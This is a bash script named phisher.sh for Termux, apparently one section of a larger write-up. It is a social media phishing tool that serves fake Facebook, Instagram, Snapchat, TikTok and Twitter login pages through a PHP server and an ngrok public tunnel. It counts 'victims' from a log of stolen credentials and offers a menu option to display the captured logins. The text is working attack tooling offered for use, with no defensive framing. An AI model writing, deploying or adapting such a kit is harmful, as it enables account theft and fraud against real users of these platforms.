### 3. `phisher.sh`
```bash
#!/data/data/com.termux/files/usr/bin/bash
RED='\033[0;31m';GREEN='\033[0;32m';YELLOW='\033[1;33m';BLUE='\033[0;34m';PURPLE='\033[0;35m';CYAN='\033[0;36m';NC='\033[0m'

clear_screen(){clear;echo -e "${CYAN}╔══════════════════════════════════════════════════════╗${NC}";echo -e "${CYAN}║              ${RED}SOCIAL MEDIA PHISHER${NC}               ${CYAN}║${NC}";echo -e "${CYAN}║                  ${BLUE}v2.1 - Termux${NC}                     ${CYAN}║${NC}";echo -e "${CYAN}╚══════════════════════════════════════════════════════╝${NC}";echo;}

show_menu(){echo -e "${GREEN}Select Platform:${NC}";echo "1) ${YELLOW}Facebook${NC}";echo "2) ${YELLOW}Instagram${NC}";echo "3) ${YELLOW}Snapchat${NC}";echo "4) ${YELLOW}TikTok${NC}";echo "5) ${YELLOW}Twitter${NC}";echo "6) ${YELLOW}Custom${NC}";echo "7) ${GREEN}View Creds${NC}";echo "0) ${RED}Exit${NC}";echo;}

start_phish(){local platform=$1;local port=8080;cp "templates/${platform}.html" index.html;echo -e "${GREEN}[+] Starting ${YELLOW}$platform${GREEN}:${port}${NC}";php -S 0.0.0.0:$port>/dev/null 2>&1&PHP_PID=$!;sleep 2;if command -v ngrok>/dev/null 2>&1;then ngrok http $port>ngrok.log 2>&1&NGROK_PID=$!;sleep 3;ngrok_url=$(grep -o 'https://.*ngrok.io' ngrok.log|head -1||echo "");[ -n "$ngrok_url" ]&&echo -e "${GREEN}[+] Public:${CYAN}${ngrok_url}${NC}";fi;echo -e "${GREEN}[+] Local:${CYAN}http://localhost:${port}${NC}";echo -e "${PURPLE}[*] Ctrl+C to stop${NC}";echo;while kill -0 $PHP_PID 2>/dev/null;do count=$(grep -c "CREDENTIALS_STOLEN" logs/credentials.txt 2>/dev/null||echo 0);echo -e "${GREEN}👥 Victims:${RED}${count}${NC} | ${GREEN}Server:${NC}🟢";sleep 2;done;kill $PHP_PID $NGROK_PID 2>/dev/null;rm -f ngrok.log;}

show_creds(){echo -e "${GREEN}=== 🕷️ CREDS ===${NC}";[ -f "logs/readable.txt" ]&&cat logs/readable.txt||echo -e "${YELLOW}[!] No creds${NC}";read -p "Enter...";}

main(){clear_screen;show_menu;read -p "Choice: " choice;case $choice in 1)start_phish facebook;;2)start_phish instagram;;3)start_phish snapchat;;4)start_phish tiktok;;5)start_phish twitter;;6)read -p "Template file: " f;[ -f "templates/$f" ]&&start_phish "$f"||echo "Not found";;7)show_creds;;0)exit;;*)main;;esac}

command -v php>/dev/null||{echo -e "${RED}[!] pkg install php${NC}";exit 1;}
mkdir -p logs www 2>/dev/null
main "$@"
